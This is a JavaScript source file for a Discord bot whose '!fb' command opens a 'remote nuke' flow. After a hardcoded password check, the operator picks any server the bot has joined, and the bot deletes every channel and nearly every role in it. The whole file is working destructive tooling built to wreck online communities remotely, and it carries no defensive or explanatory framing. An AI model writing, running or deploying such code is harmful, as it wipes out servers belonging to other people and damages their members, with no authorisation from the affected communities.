const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'flower2017';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// Ready
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// Message Commands
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  if (message.content.toLowerCase() === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 REMOTE NUKE')
      .setDescription('Enter password, then choose which server to nuke.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`fb_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const userId = interaction.customId.split('_')[2];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    // Button → Password Modal
    if (interaction.isButton() && interaction.customId.startsWith('fb_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`fb_modal_${userId}`)
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('password')
          .setLabel('Password')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // Password Correct → Show Server Selector
    if (interaction.isModalSubmit() && interaction.customId.startsWith('fb_modal_')) {
      const password = interaction.fields.getTextInputValue('password');

      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      const servers = client.guilds.cache.map(guild => ({
        label: guild.name.length > 25 ? guild.name.slice(0, 22) + '...' : guild.name,
        value: guild.id,
        description: `${guild.memberCount} members`
      }));

      if (servers.length === 0) {
        return interaction.reply({ content: '❌ Bot is not in any servers.', ephemeral: true });
      }

      const menu = new StringSelectMenuBuilder()
        .setCustomId(`fb_server_${userId}`)
        .setPlaceholder('Choose server to NUKE')
        .addOptions(servers);

      const row = new ActionRowBuilder().addComponents(menu);

      await interaction.reply({
        content: '✅ Password correct! Select the server to nuke:',
        components: [row],
        ephemeral: true
      });
    }

    // Server Selected → Nuke it
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('fb_server_')) {
      await interaction.deferUpdate();

      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);

      if (!guild) return interaction.followUp({ content: '❌ Server not found.', ephemeral: true });

      await interaction.followUp({ content: `🔴 **NUKING ${guild.name}...**`, ephemeral: true });

      try {
        // Delete channels
        for (const channel of guild.channels.cache.values()) {
          await channel.delete().catch(() => {});
        }

        // Delete roles (except @everyone and Owner)
        for (const role of guild.roles.cache.values()) {
          if (role.name === '@everyone' || role.name === 'Owner') continue;
          await role.delete().catch(() => {});
        }

        await interaction.followUp({ content: `✅ **${guild.name} has been nuked!**`, ephemeral: true });
      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
      }
    }

  } catch (error) {
    console.error(error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
